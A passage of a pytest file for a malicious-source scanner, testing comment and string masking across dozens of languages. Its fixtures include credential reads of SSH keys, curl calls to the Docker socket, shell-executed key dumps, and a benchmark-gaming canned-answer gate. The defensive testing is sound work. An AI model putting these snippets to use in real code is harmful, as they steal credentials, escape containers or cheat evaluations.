"""Language-aware comment and string masking (#2457).

Masking feeds every deterministic scanner, so it must fail in neither
direction: foreign comment syntax must not erase real code, and a language's
own comments must not fabricate findings.
"""

from __future__ import annotations

import random
import time

import pytest

from ditto_screener.evidence_quality import citation_admissibility
from ditto_screener.rust_test_items import test_only_item_lines as rust_test_items
from ditto_screener.source_masking import language_for_path
from ditto_screener.source_signals import (
    find_benchmark_emulation_fingerprints,
    find_decisive_malicious_source,
    find_source_review_leads,
    mask_comments,
    mask_lead_comments,
    mask_proven_comments,
    mask_string_literals,
)

_LINE_BREAKS = "\n\r\x0b\x0c\x1c\x1d\x1e\x85  "


def _blank(text: str, *parts: str) -> str:
    """Replace each unique ``part`` of ``text`` with spaces, keeping line breaks."""
    for part in parts:
        assert text.count(part) == 1, part
        blanked = "".join(char if char in _LINE_BREAKS else " " for char in part)
        text = text.replace(part, blanked)
    return text


# (path, raw, comment text, string-literal text). The comment view blanks the
# comments; the string view additionally blanks the literals.
_LANGUAGE_TABLE = [
    pytest.param(
        "src/agent.py",
        "files = glob.glob('data/*.json')  # see /* notes\n"
        "half = total // 2\n"
        "s = f'{load(x)} done'\n",
        ("# see /* notes",),
        ("'data/*.json'", "f'", " done'"),
        id="python",
    ),
    pytest.param(
        "src/main.rs",
        "fn pick<'a>(x: &'a str) -> char { '\"' } // c\n"
        'let r = r#"*/ // "#; /* a /* b */ c */ run();\n'
        "let s = \"don't // read\"; let e = '\\u{1F600}'; let l = '/';\n",
        ("// c", "/* a /* b */ c */"),
        ("'\"'", 'r#"*/ // "#', '"don\'t // read"', "'\\u{1F600}'", "'/'"),
        id="rust",
    ),
    pytest.param(
        "cmd/main.go",
        "x := `http://a/*` // c\ny := '\\''; z := \"a//b\" /* d */\n",
        ("// c", "/* d */"),
        ("`http://a/*`", "'\\''", '"a//b"'),
        id="go",
    ),
    pytest.param(
        "csrc/shim.c",
        "int n = 1'000; char q = '\"'; /* a *\\\n/ run(); // c\n"
        'const char *s = R"x(")x";\n',
        ("/* a *\\\n/", "// c"),
        ("'\"'", 'R"x(")x"'),
        id="c",
    ),
    pytest.param(
        "src/server.ts",
        "const u = 'http://x/*'; const r = /[/*]/; // c\n"
        "const t = `a ${f('`')} b`; if (ok) /x\\/*/.test(u);\n",
        ("// c",),
        ("'http://x/*'", "`a ", "'`'", " b`"),
        id="typescript",
    ),
    pytest.param(
        "scripts/run.sh",
        "#!/bin/sh\necho \"a # b\" $# ${#x} x#y # c\ncat <<'EOF'\n# body\nEOF\n",
        ("# c",),
        (),
        id="shell",
    ),
    pytest.param(
        "Dockerfile",
        "# syntax=docker/dockerfile:1\nFROM alpine\n  # docker.sock prose\n"
        "RUN echo 'a # b' \\\n  # dropped by docker\n  && run # tail\n"
        "RUN <<EOF\n# body\nEOF\nENV X=a#b # an ENV value\n",
        ("# docker.sock prose", "# dropped by docker", "# tail"),
        (),
        id="dockerfile",
    ),
    pytest.param(
        "Cargo.toml",
        "a = \"x # y\" # c\nb = '''\n# kept\n'''\n",
        ("# c",),
        (),
        id="toml",
    ),
    pytest.param(
        "config.yaml",
        "a: it's # c\nb: 'x # y'\nrun: |\n  # body\n",
        ("# c",),
        (),
        id="yaml",
    ),
    pytest.param(
        "Makefile",
        "X = \"a # b\"\nY = $(shell echo '#') # c\nall:\n\techo # recipe\n",
        ('# b"', "# c"),
        (),
        id="make",
    ),
    pytest.param(
        "requirements-dev.txt",
        "pkg==1 # c\npkg @ https://x#egg=pkg\n",
        ("# c",),
        (),
        id="requirements",
    ),
    pytest.param(
        ".env.example",
        "# prose\nKEY=a#b # consumers disagree\n",
        ("# prose",),
        (),
        id="dotenv",
    ),
    pytest.param("setup.cfg", "; c\n# d\nkey = a # e\n", ("; c", "# d"), (), id="ini"),
    pytest.param("README.md", "// x /* y */ # z\n", (), (), id="markdown"),
    pytest.param(
        "src/App.java",
        "String u = \"http://x/*\"; char c = '/'; /* a // b */ run(); // c\n"
        'String t = """\n  x // y\n  """;\n',
        ("/* a // b */", "// c"),
        (),
        id="java",
    ),
    pytest.param(
        "src/Main.kt",
        'val u = "http://${h("/*")}/y"; val m = "id=$n!"; val c = \'"\'\n'
        '/* a /* b */ c */ run() // d\nval r = """a // "q" """"; val `n // x` = 1\n',
        ("/* a /* b */ c */", "// d"),
        (),
        id="kotlin",
    ),
    pytest.param(
        "src/Program.cs",
        'var u = "http://x/*"; var p = @"C:\\t"" // no"; var i = $"id={id,5:N2} //";\n'
        "/* a // b */ Run(); // c\u2028Run2(); char q = '\"';\n#region r // message\n",
        ("/* a // b */", "// c"),
        (),
        id="csharp",
    ),
    pytest.param(
        "lib/main.dart",
        "var u = 'http://x/y'; var s = 'a${f(\"/*\")}b $n.'; var r = r'\\';\n"
        "/* a /* b */ c */ run(); // d\nvar m = '''\n// in string\n''';\n",
        ("/* a /* b */ c */", "// d"),
        (),
        id="dart",
    ),
    pytest.param(
        "src/index.php",
        "<?php\n$u = 'http://x/y'; run(); # c\n"
        '$g = "*/ $v[0] {"; /* a // b */ $o = `ls // x`; // d\n'
        "#[Attr('// k')] function f() {}\n",
        ("# c", "/* a // b */", "// d"),
        (),
        id="php",
    ),
    pytest.param("web/app.jsx", "// x 'y' /* z\n", ("// x 'y' /* z",), (), id="jsx"),
    pytest.param(
        "web/view.jsx", "const v = <p>it's // x</p>; // c\n", (), (), id="jsx-element"
    ),
    pytest.param(
        "src/main.zig",
        "const s = \"a // b\"; const c = '/'; // c\n/// doc\nconst m =\n"
        '    \\\\ x // y\n;\nconst n = @"q // r";\n',
        ("// c", "/// doc"),
        (),
        id="zig",
    ),
    pytest.param(
        "Sources/main.swift",
        'let u = "http://x/\\(f("/*")) // no"; let d = 4 / 2 // c\n'
        '/* a /* b */ c */ let m = """\n  x // y\n  """\nlet w = #"q \\ "// raw"#\n',
        ("// c", "/* a /* b */ c */"),
        (),
        id="swift",
    ),
    pytest.param(
        "src/Main.scala",
        'val u = s"http://${f("/*")}/y"; val c = \'/\' // d\n'
        '/* a /* b */ c */ val t = """a // "q" """"; val `n // x` = \'sym\n',
        ("// d", "/* a /* b */ c */"),
        (),
        id="scala",
    ),
    pytest.param(
        "build.gradle",
        "def u = 'http://x/y'; def g = \"${f('/*')} // no\"; def q = a / 2 // c\n"
        "/* a // b */ task t { doLast { println '''x // y''' } }\n",
        ("// c", "/* a // b */"),
        (),
        id="gradle",
    ),
    pytest.param(
        "src/App.fs",
        'let u = "http://x/y" // c\nlet i = (*) 2 3 (* a (* b "*)" *) c *) + 1\n'
        'let v = @"C:\\x"" // no"; let f x\' = x\' / 2\n',
        ("// c", '(* a (* b "*)" *) c *)'),
        (),
        id="fsharp",
    ),
    pytest.param(
        "src/Bridge.mm",
        'NSString *s = @"a // b"; // c\nconst char *r = R"x( /* )x"; /* d */\n',
        ("// c", "/* d */"),
        ('"a // b"', 'R"x( /* )x"'),
        id="objective-c++",
    ),
]


@pytest.mark.parametrize(("path", "raw", "comments", "strings"), _LANGUAGE_TABLE)
def test_language_table_masks_exactly_the_language_syntax(
    path: str, raw: str, comments: tuple[str, ...], strings: tuple[str, ...]
) -> None:
    comment_masked = mask_comments(raw, path)
    code_only = mask_string_literals(comment_masked, path)

    assert comment_masked == _blank(raw, *comments)
    assert code_only == _blank(comment_masked, *strings)


@pytest.mark.parametrize(
    ("path", "comment"),
    [
        ("src/agent.py", "# {}"),
        ("src/main.rs", "/* {} */"),
        ("cmd/main.go", "// {}"),
        ("csrc/shim.c", "/* {} */"),
        ("src/server.js", "/* {} */"),
        ("scripts/run.sh", "# {}"),
        ("Dockerfile", "# {}"),
        ("Cargo.toml", "# {}"),
        ("config.yml", "# {}"),
        ("Makefile", "# {}"),
        ("requirements.txt", "# {}"),
        (".env", "# {}"),
        ("setup.cfg", "; {}"),
        ("notes.unknown", "// {}"),
    ],
)
def test_masking_preserves_length_and_every_line_boundary(
    path: str, comment: str
) -> None:
    exotic = "a\x0cb\x0bc\x1cd\x85e f g"
    raw = comment.format(exotic) + "\r\nvalue = 1\n" + comment.format("h") + "\n"

    for masked in (
        mask_comments(raw, path),
        mask_string_literals(mask_comments(raw, path), path),
    ):
        assert len(masked) == len(raw)
        assert len(masked.splitlines()) == len(raw.splitlines())
        assert masked.splitlines()[-2] == raw.splitlines()[-2]


def _decisive(path: str, source: str) -> list[dict[str, object]]:
    return find_decisive_malicious_source(
        [(path, source)], explicitly_executable_paths=frozenset({path})
    )


@pytest.mark.parametrize(
    ("path", "source"),
    [
        pytest.param(
            "src/agent.py",
            "# Never read ~/.ssh or .env files here.\nprint('ready')\n",
            id="python-hash-comment",
        ),
        pytest.param(
            "Dockerfile",
            "FROM rust:1\n# Do not mount /var/run/docker.sock; run as a user.\n"
            "RUN cargo build --release\n",
            id="dockerfile-comment",
        ),
        pytest.param(
            "scripts/run.sh",
            "#!/bin/sh\n# We never cat ~/.ssh/id_rsa in this script.\nexec ./server\n",
            id="shell-comment",
        ),
        pytest.param(
            "src/main.rs",
            "fn pick<'a>(x: &'a str) -> &'a str { x }\n"
            'const PROMPT: &str = "don\'t read ~/.ssh/id_rsa ... std::fs::read";\n',
            id="rust-lifetimes-then-prompt",
        ),
    ],
)
def test_prose_never_becomes_a_decisive_finding(path: str, source: str) -> None:
    assert _decisive(path, source) == []


# javac, kotlinc, Roslyn, the Dart scanner, and PHP 8.3 each read these lines
# as a comment. Unmasked, the prose raised a decisive finding and stayed
# citable as evidence.
@pytest.mark.parametrize(
    ("path", "source", "line"),
    [
        pytest.param(
            "src/Sandbox.java",
            "// Mounts /var/run/docker.sock and calls Runtime.getRuntime().exec(cmd).\n"
            "public class Sandbox {}\n",
            1,
            id="java",
        ),
        pytest.param(
            "src/Sandbox.kt",
            "/* Mounts /var/run/docker.sock and calls\n"
            "   Runtime.getRuntime().exec(cmd). */\nclass Sandbox\n",
            2,
            id="kotlin",
        ),
        pytest.param(
            "src/Sandbox.cs",
            "/// Mounts /var/run/docker.sock and calls Process.Start(cmd).\n"
            "class Sandbox {}\n",
            1,
            id="csharp",
        ),
        pytest.param(
            "lib/sandbox.dart",
            "// Mounts /var/run/docker.sock and calls Process.run(cmd).\n"
            "class Sandbox {}\n",
            1,
            id="dart",
        ),
        pytest.param(
            "src/sandbox.php",
            "<?php\n# Mounts /var/run/docker.sock and calls shell_exec($cmd).\n"
            "class Sandbox {}\n",
            2,
            id="php",
        ),
    ],
)
def test_c_family_comment_prose_is_not_evidence(
    path: str, source: str, line: int
) -> None:
    assert _decisive(path, source) == []
    assert citation_admissibility(path, source, line).reason == "comment-or-blank"


@pytest.mark.parametrize(
    ("path", "source"),
    [
        pytest.param(
            "src/S.java",
            'class S { void m() throws Exception { new ProcessBuilder("curl",'
            ' "--unix-socket", "/var/run/docker.sock", "http://x").start(); } }\n',
            id="java",
        ),
        # The command is the string; the process-execution exception does
        # not name PHP's APIs, so PHP strings stay visible to effect roles.
        pytest.param(
            "src/s.php",
            "<?php\n$out = shell_exec("
            "'curl --unix-socket /var/run/docker.sock http://x/containers/json');\n",
            id="php-command-string",
        ),
    ],
)
def test_c_family_code_effects_are_still_found(path: str, source: str) -> None:
    assert "malicious_build" in {
        finding["category"] for finding in _decisive(path, source)
    }


# The real tool runs ``run()`` in each (javac 21, PHP 8.3, the .NET 8 SDK):
# a Unicode escape, ``?>``, or a skipped ``#if`` section moves where the
# comment ends, so the file is left unmasked rather than blanked to the line
# end.
@pytest.mark.parametrize(
    ("path", "source"),
    [
        pytest.param(
            "src/A.java",
            "class A { void m() { // c \\u000a run();\n } }\n",
            id="java-unicode-escape",
        ),
        pytest.param("src/a.php", "<?php // c ?> <?php run();\n", id="php-close-tag"),
        pytest.param(
            "src/P.cs",
            "#if NEVER\n/*\n#endif\nRun();\n#if NEVER\n*/\n#endif\n",
            id="csharp-skipped-section",
        ),
    ],
)
def test_a_construct_that_moves_a_comment_end_leaves_the_file_unmasked(
    path: str, source: str
) -> None:
    assert mask_comments(source, path) == source


# Literal forms these lexers do not bound. Each could hold ``/*`` or a quote
# that a guess would read as a comment opener, blanking the call after it.
@pytest.mark.parametrize(
    ("path", "source"),
    [
        pytest.param(
            "src/P.cs", 'var s = """a " /* b"""; Run(); // */\n', id="csharp-raw-string"
        ),
        pytest.param(
            "src/P.cs", 'var s = $"{f("/*")}"; Run(); // */\n', id="csharp-field-quote"
        ),
        pytest.param(
            "src/A.java",
            'var s = STR."\\{f("/*")}"; run(); // */\n',
            id="java-string-template",
        ),
        pytest.param(
            "src/a.php",
            "<?php\n$h = <<<EOT\n/*\nEOT;\nrun(); // */\n",
            id="php-here-document",
        ),
        pytest.param(
            "src/a.php",
            '<?php\n$s = "{$a["/*"]}"; run(); // */\n',
            id="php-complex-field",
        ),
        pytest.param(
            "src/a.php", "<p>/* markup</p><?php run(); // */\n", id="php-markup-first"
        ),
    ],
)
def test_unbounded_c_family_literals_leave_the_file_unmasked(
    path: str, source: str
) -> None:
    assert mask_comments(source, path) == source


def test_csharp_comment_ends_at_every_csharp_line_break() -> None:
    """Roslyn ends ``//`` at NEL, LS, and PS; ``Run()`` after each is code."""
    for separator in ("\x85", "\u2028", "\u2029"):
        source = f"class P {{ void M() {{ // c{separator}Run(); }} }}\n"

        assert "Run();" in mask_comments(source, "src/P.cs")


_OVERRIDE_PROSE = "grader slot contains token override"


def test_a_zig_comment_raises_no_source_review_lead() -> None:
    """The maintainer's case: every role of the lead cited the comment."""
    source = f"// {_OVERRIDE_PROSE}\nfn main() {{}}\n"

    assert find_source_review_leads([("src/main.zig", source)]) == []


# Each comment raised a challenge-shaped-retrieval-override lead whose roles
# all cited the comment, when its language had no lexer (Zig, Swift, Scala,
# Groovy and F# now have one; the rest rely on the comment-line view) or its
# lexer left the file unmasked (the JSX and Java files). The same words as
# code still do.
@pytest.mark.parametrize(
    ("path", "comment", "code"),
    [
        pytest.param(
            "src/main.zig",
            f"// {_OVERRIDE_PROSE}\nfn main() {{}}\n",
            f'const note = "{_OVERRIDE_PROSE}";\n',
            id="zig",
        ),
        pytest.param(
            "Sources/main.swift",
            f"/// {_OVERRIDE_PROSE}\nlet x = 1\n",
            f'let note = "{_OVERRIDE_PROSE}"\n',
            id="swift",
        ),
        pytest.param(
            "src/Main.scala",
            f"/*\n * {_OVERRIDE_PROSE}\n */\nobject Main\n",
            f'val note = "{_OVERRIDE_PROSE}"\n',
            id="scala-block",
        ),
        pytest.param(
            "build.gradle",
            f"// {_OVERRIDE_PROSE}\napply plugin: 'java'\n",
            f"def note = '{_OVERRIDE_PROSE}'\n",
            id="gradle",
        ),
        pytest.param(
            "src/App.fs",
            f"(* {_OVERRIDE_PROSE} *)\nlet x = 1\n",
            f'let note = "{_OVERRIDE_PROSE}"\n',
            id="fsharp",
        ),
        pytest.param(
            "src/app.rb",
            f"# {_OVERRIDE_PROSE}\nputs 1\n",
            f'note = "{_OVERRIDE_PROSE}"\n',
            id="ruby",
        ),
        pytest.param(
            "lib/app.ex",
            f"# {_OVERRIDE_PROSE}\nIO.puts 1\n",
            f'note = "{_OVERRIDE_PROSE}"\n',
            id="elixir",
        ),
        pytest.param(
            "src/app.lua",
            f"-- {_OVERRIDE_PROSE}\nprint(1)\n",
            f'local note = "{_OVERRIDE_PROSE}"\n',
            id="lua",
        ),
        pytest.param(
            "src/app.erl",
            f"% {_OVERRIDE_PROSE}\n-module(app).\n",
            f'Note = "{_OVERRIDE_PROSE}".\n',
            id="erlang",
        ),
        pytest.param(
            "src/app.hs",
            f"-- {_OVERRIDE_PROSE}\nmain = pure ()\n",
            f'note = "{_OVERRIDE_PROSE}"\n',
            id="haskell",
        ),
        pytest.param(
            "src/app.ml",
            f"(* {_OVERRIDE_PROSE} *)\nlet x = 1\n",
            f'let note = "{_OVERRIDE_PROSE}"\n',
            id="ocaml",
        ),
        pytest.param(
            "src/app.pl",
            f"# {_OVERRIDE_PROSE}\nprint 1;\n",
            f'my $note = "{_OVERRIDE_PROSE}";\n',
            id="perl",
        ),
        pytest.param(
            "src/app.jl",
            f"# {_OVERRIDE_PROSE}\nx = 1\n",
            f'note = "{_OVERRIDE_PROSE}"\n',
            id="julia",
        ),
        pytest.param(
            "CMakeLists.txt",
            f"# {_OVERRIDE_PROSE}\nproject(x)\n",
            f'set(NOTE "{_OVERRIDE_PROSE}")\n',
            id="cmake",
        ),
        pytest.param(
            "pom.xml",
            f"<!-- {_OVERRIDE_PROSE} -->\n<project/>\n",
            f"<note>{_OVERRIDE_PROSE}</note>\n",
            id="maven",
        ),
        pytest.param(
            "src/App.jsx",
            f"// {_OVERRIDE_PROSE}\nexport const A = () => <p>hi</p>;\n",
            f'const note = "{_OVERRIDE_PROSE}";\n',
            id="jsx-left-unmasked",
        ),
        pytest.param(
            "src/A.java",
            f"// {_OVERRIDE_PROSE}\nclass A {{ char c = '\\u0041'; }}\n",
            f'class A {{ String n = "{_OVERRIDE_PROSE}"; }}\n',
            id="java-left-unmasked",
        ),
    ],
)
def test_a_comment_line_raises_no_lead_in_any_listed_language(
    path: str, comment: str, code: str
) -> None:
    assert find_source_review_leads([(path, comment)]) == []
    assert find_source_review_leads([(path, code)]) != []


def test_a_jsx_comment_line_raises_no_fingerprint() -> None:
    """The JSX element leaves the file unmasked; the comment line is still prose."""
    gate = "function run(r) { if (r.benchVersion === 11) return canned(); }\n"
    element = "export const A = () => <p>hi</p>;\n"

    assert (
        find_benchmark_emulation_fingerprints([("src/a.jsx", element + "// " + gate)])
        == []
    )
    assert find_benchmark_emulation_fingerprints([("src/a.jsx", element + gate)]) != []


def test_comment_lines_leave_the_security_views_whole() -> None:
    """Only lead matching drops comment-looking lines the lexer cannot prove.

    ``sh`` runs ``//usr/bin/curl``: the line is a string the shell executes.
    The bare ``/.../`` on line 1 leaves this Swift file unlexed, so the lead
    view blanks the line as a comment, but the decisive preflight and citation
    admissibility still read it. A Ruby ``#{...}`` heredoc line is code, so
    the lead view keeps it too.
    """
    swift = (
        "let pattern = /id_rsa/\n"
        'let script = """\n'
        "//usr/bin/curl --unix-socket /var/run/docker.sock http://x/containers/json\n"
        '"""\n'
        'let p = Process(); p.launchPath = "/bin/sh"; p.arguments = ["-c", script]\n'
    )
    ruby = 'key = <<~RUBY\n#{File.read(File.expand_path("~/.ssh/id_rsa"))}\nRUBY\n'

    assert mask_comments(swift, "Sources/main.swift") == swift
    assert not mask_lead_comments(swift, "Sources/main.swift").splitlines()[2].strip()
    assert "malicious_build" in {
        f["category"] for f in _decisive("Sources/main.swift", swift)
    }
    assert citation_admissibility("Sources/main.swift", swift, 3).admissible
    assert mask_lead_comments(ruby, "src/app.rb") == ruby
    assert "credential_access" in {f["category"] for f in _decisive("src/app.rb", ruby)}


_READ_KEY = 'read("/root/.ssh/id_rsa")'


def test_the_maintainers_swift_comment_is_not_a_decisive_finding() -> None:
    """Both roles of each finding cited the inline comment."""
    assert (
        find_decisive_malicious_source(
            [("Sources/main.swift", 'fn main() {} // read("/root/.ssh/id_rsa")\n')]
        )
        == []
    )


@pytest.mark.parametrize("verb", ["read", "exec(read"])
def test_inert_swift_prompt_is_not_a_decisive_effect(verb: str) -> None:
    source = f'let prompt = "{verb}(\\"/root/.ssh/id_rsa\\")"\nprint(prompt)\n'
    assert _decisive("Sources/main.swift", source) == []


@pytest.mark.parametrize("multiline", [False, True])
@pytest.mark.parametrize("binding", [False, True])
def test_swift_shell_credential_payload_remains_decisive(
    multiline: bool, binding: bool
) -> None:
    literal = (
        '"""\ncat /root/.ssh/id_rsa\n"""' if multiline else '"cat /root/.ssh/id_rsa"'
    )
    source = "import Foundation\n"
    if binding:
        source += f"let script = {literal}\n"
    source += (
        "let p = Process()\n"
        'p.executableURL = URL(fileURLWithPath: "/bin/sh")\n'
        f'p.arguments = ["-c", {"script" if binding else literal}]\n'
        "try p.run()\n"
    )
    assert "credential_access" in {
        f["category"] for f in _decisive("Sources/main.swift", source)
    }


def test_swift_echo_prompt_does_not_execute_prompt() -> None:
    source = (
        'let prompt = "read(\\"/root/.ssh/id_rsa\\")"\n'
        "let p = Process()\n"
        'p.executableURL = URL(fileURLWithPath: "/bin/echo")\n'
        "p.arguments = [prompt]\ntry p.run()\n"
    )
    assert _decisive("Sources/main.swift", source) == []


def test_swift_nearest_safe_assignment_does_not_revive_payload() -> None:
    source = (
        'var script = "cat /root/.ssh/id_rsa"\nscript = "echo hello"\n'
        "let p = Process()\n"
        'p.executableURL = URL(fileURLWithPath: "/bin/sh")\n'
        'p.arguments = ["-c", script]\ntry p.run()\n'
    )
    assert _decisive("Sources/main.swift", source) == []


# Inline and whole-line comments in each C-comment language main's generic
# scanner used to mask. Each raised credential_access and cross_user_access
# from the comment alone; the same call as code still does.
@pytest.mark.parametrize(
    ("path", "inline", "whole", "code"),
    [
        pytest.param(
            "Sources/main.swift",
            f"func main() {{}} // {_READ_KEY}\n",
            f"/**\n {_READ_KEY}\n */\nfunc main() {{}}\n",
            f"let key = {_READ_KEY}\n",
            id="swift",
        ),
        pytest.param(
            "src/Main.scala",
            f"object M {{}} // {_READ_KEY}\n",
            f"/* {_READ_KEY} */\nobject M\n",
            f"val key = {_READ_KEY}\n",
            id="scala",
        ),
        pytest.param(
            "src/app.groovy",
            f"def m() {{}} // {_READ_KEY}\n",
            f"// {_READ_KEY}\ndef m() {{}}\n",
            f"def key = {_READ_KEY}\n",
            id="groovy",
        ),
        pytest.param(
            "build.gradle",
            f"apply plugin: 'java' // {_READ_KEY}\n",
            f"/* {_READ_KEY} */\napply plugin: 'java'\n",
            f"def key = {_READ_KEY}\n",
            id="gradle",
        ),
        pytest.param(
            "src/App.fs",
            f"let m () = () // {_READ_KEY}\n",
            f"(* {_READ_KEY} *)\nlet m () = ()\n",
            f"let key = {_READ_KEY}\n",
            id="fsharp",
        ),
        pytest.param(
            "src/Bridge.mm",
            f"int main() {{}} // {_READ_KEY}\n",
            f"/* {_READ_KEY} */\nint main() {{}}\n",
            f"auto key = {_READ_KEY};\n",
            id="objective-c++",
        ),
    ],
)
def test_a_c_family_comment_is_not_a_decisive_finding(
    path: str, inline: str, whole: str, code: str
) -> None:
    assert find_decisive_malicious_source([(path, inline)]) == []
    assert find_decisive_malicious_source([(path, whole)]) == []
    assert {f["category"] for f in find_decisive_malicious_source([(path, code)])} == {
        "credential_access",
        "cross_user_access",
    }


# swiftc builds each and the served process runs the command in the string,
# ``//usr/bin/...`` line included. Strings are never masked, so the decisive
# preflight still sees it.
@pytest.mark.parametrize(
    "literal",
    [
        pytest.param(
            '"""\n//usr/bin/curl --unix-socket /var/run/docker.sock http://x/containers/json\n"""',
            id="multi-line",
        ),
        pytest.param(
            '#"curl --unix-socket /var/run/docker.sock http://x/containers/json // q"#',
            id="raw",
        ),
    ],
)
def test_a_served_swift_process_running_a_string_is_found(literal: str) -> None:
    source = (
        "import Foundation\n"
        f"let script = {literal}\n"
        "let p = Process()\n"
        'p.executableURL = URL(fileURLWithPath: "/bin/sh")\n'
        'p.arguments = ["-c", script]\n'
        "try p.run()\n"
    )

    assert "malicious_build" in {
        f["category"] for f in _decisive("Sources/main.swift", source)
    }


# The lexer gives up at a construct it cannot decide (a Swift ``/`` that may
# open a regular expression, a Scala XML literal). Comments before it are
# still proven and masked; one after it keeps its finding, since no reading
# of the rest is proven.
@pytest.mark.parametrize(
    ("path", "undecidable"),
    [
        pytest.param("Sources/main.swift", "let r = /a b/\n", id="swift-regex"),
        pytest.param("src/Main.scala", "object X { val x = <a/> }\n", id="scala-xml"),
    ],
)
def test_comments_before_an_undecidable_construct_are_still_proven(
    path: str, undecidable: str
) -> None:
    comment = f"// {_READ_KEY}\n"

    assert mask_comments(comment + undecidable, path) == comment + undecidable
    assert find_decisive_malicious_source([(path, comment + undecidable)]) == []
    assert find_decisive_malicious_source([(path, undecidable + comment)]) != []


def test_proven_comments_cover_only_the_prefix_that_lexes() -> None:
    source = "// a\nlet r = /x y/ // b\n// c\n"

    assert mask_proven_comments(source, "Sources/main.swift", [1]) == (
        "    \nlet r = /x y/ // b\n// c\n"
    )
    assert mask_proven_comments(source, "Sources/main.swift", [3]) == source
    assert mask_proven_comments(source, "src/app.rb", [1]) == source


def test_the_decisive_preflight_reads_inner_cfg_test_code() -> None:
    """An inner ``#![cfg(test)]`` is not a test-item boundary for the scan.

    ``rustc --cfg test`` can serve the file, so its effects stay visible to the
    pre-build detector rather than being blanked as test-only.
    """
    source = (
        "#![cfg(test)]\npub fn leak() -> String {\n"
        '    std::fs::read_to_string("/root/.ssh/id_rsa").unwrap()\n}\n'
    )

    assert "credential_access" in {
        f["category"] for f in _decisive("src/lib.rs", source)
    }


def test_a_block_comment_line_view_stops_at_its_closer() -> None:
    source = "/* a\n b */ let y = f()\n/*/ no closer\nlet z = g()\n"

    assert mask_lead_comments(source, "Sources/main.swift") == (
        "    \n      let y = f()\n             \nlet z = g()\n"
    )


@pytest.mark.parametrize(
    ("path", "source", "category"),
    [
        pytest.param(
            "src/agent.py",
            "import os\nkey = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n",
            "credential_access",
            id="python-credential-read",
        ),
        pytest.param(
            "Dockerfile",
            "FROM alpine\n# prose\n"
            "RUN curl --unix-socket /var/run/docker.sock http://d/containers/json\n",
            "malicious_build",
            id="dockerfile-docker-socket",
        ),
        pytest.param(
            "src/main.rs",
            "fn pick<'a>(x: &'a str) -> &'a str { x }\n"
            'fn leak() { let _ = std::fs::read("/home/miner/.ssh/id_rsa"); }\n',
            "credential_access",
            id="rust-read-after-lifetimes",
        ),
        pytest.param(
            "src/agent.py",
            "import os\n"
            "half = n // 2; key = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n",
            "credential_access",
            id="python-floor-division-then-read",
        ),
        pytest.param(
            "scripts/run.sh",
            "#!/bin/sh\ncat ~/.ssh/id_rsa # print the key\n",
            "credential_access",
            id="shell-read-before-comment",
        ),
    ],
)
def test_real_effects_still_fire(path: str, source: str, category: str) -> None:
    assert category in {finding["category"] for finding in _decisive(path, source)}


@pytest.mark.parametrize(
    "literal", ["'x'", "'\"'", "'/'", "'\\n'", "'\\''", "'\\u{1F600}'", "b'\"'"]
)
def test_rust_char_literals_do_not_desynchronize_the_masker(literal: str) -> None:
    source = (
        "fn f<'a, 'b: 'a>(x: &'a str) -> char "
        f"{{ 'outer: loop {{ break {literal}; }} }}"
        ' // "note\n'
        'let url = "https://api.example/v1"; run(); /* c */\n'
    )

    comment_masked = mask_comments(source, "src/main.rs")
    code_only = mask_string_literals(comment_masked, "src/main.rs")

    assert comment_masked == _blank(source, ' // "note', "/* c */")
    assert "run();" in code_only.splitlines()[1]
    assert "https" not in code_only
    assert "'a str" in code_only
    assert "'outer:" in code_only


def test_a_char_escape_cannot_stretch_a_rust_test_item_over_served_code() -> None:
    """rustc builds this; ``serve`` is production code between two test items.

    Counting the ``{`` and ``}`` char literals after a ``'\\u{...}'`` escape as
    braces made the ``tests`` module appear to close on line 7, so the served
    credential read was blanked as test-only before the decisive scan.
    """
    source = (
        "#[cfg(test)]\n"
        "mod tests {\n"
        "    const A: [char; 2] = ['\\u{1F600}', '{'];\n"
        "}\n"
        "\n"
        'pub fn serve() -> Vec<u8> { std::fs::read("/root/.ssh/id_rsa").unwrap() }\n'
        "const B: [char; 2] = ['\\u{1F600}', '}'];\n"
    )

    lines = rust_test_items(mask_comments(source, "src/lib.rs").splitlines())

    assert lines == frozenset({1, 2, 3, 4})
    assert "credential_access" in {
        finding["category"] for finding in _decisive("src/lib.rs", source)
    }


def test_rust_raw_strings_cannot_close_or_open_comments() -> None:
    source = 'let a = r#"*/"#; run();\nlet b = r##"/* "# "##; go();\n'

    assert mask_comments(source, "src/main.rs") == source
    assert mask_string_literals(source, "src/main.rs") == _blank(
        source, 'r#"*/"#', 'r##"/* "# "##'
    )


def test_block_comment_nesting_follows_the_language() -> None:
    """Rust nests block comments; Go, C, and JavaScript do not.

    Treating a flat-comment language as nesting would let ``/* /* */`` hide
    everything up to a later ``*/``.
    """
    nested = "/* /* */ run(); */\n"
    flat = "/* /* */ run(); /* */\n"

    assert mask_comments(nested, "src/main.rs") == _blank(nested, nested[:-1])
    for path in ("cmd/main.go", "csrc/shim.c", "src/server.js"):
        assert mask_comments(flat, path) == _blank(flat, "/* /* */", "/* */\n")
        assert "run();" in mask_comments(nested, path)


def test_javascript_regex_after_a_condition_is_not_a_comment() -> None:
    source = "if (ready) /[/*]/.test(input);\nrun();\nconst half = total / 2; // c\n"

    assert mask_comments(source, "src/server.js") == _blank(source, "// c")


# Each program is valid JavaScript or TypeScript that Node runs, and each one
# calls hidden(). Where a slash could divide or open a regular expression and
# the preceding token does not decide which, a guess lets a crafted line fold
# that call into a comment or string. Such a file is left unmasked.
_AMBIGUOUS_SLASHES = [
    pytest.param(
        "src/a.js",
        'x = {a: 1} / 2; y = "/ //"; hidden();\n',
        id="object-literal-division",
    ),
    pytest.param(
        "src/a.js",
        'x = function () {} / 2; y = "/ //"; hidden();\n',
        id="function-expression-division",
    ),
    pytest.param(
        "src/a.js",
        'let of = 4; x = of / 2; y = "/ //"; hidden();\n',
        id="of-identifier",
    ),
    pytest.param(
        "src/a.js",
        'var yield = 4; x = yield / 2; y = "/ //"; hidden();\n',
        id="yield-identifier",
    ),
    pytest.param(
        "src/a.js",
        'var await = 4; x = await / 2; y = "/ //"; hidden();\n',
        id="await-identifier",
    ),
    pytest.param(
        "src/a.js",
        'x = obj.\nif(1) / 2; y = "/ //"; hidden();\n',
        id="keyword-property-after-a-line-break",
    ),
    pytest.param(
        "src/a.js",
        'x = obj./**/if(1) / 2; y = "/ //"; hidden();\n',
        id="keyword-property-after-a-comment",
    ),
    pytest.param(
        "src/a.js",
        "x = obj." + " " * 20 + 'return / 2; y = "/ //"; hidden();\n',
        id="keyword-property-after-blanks",
    ),
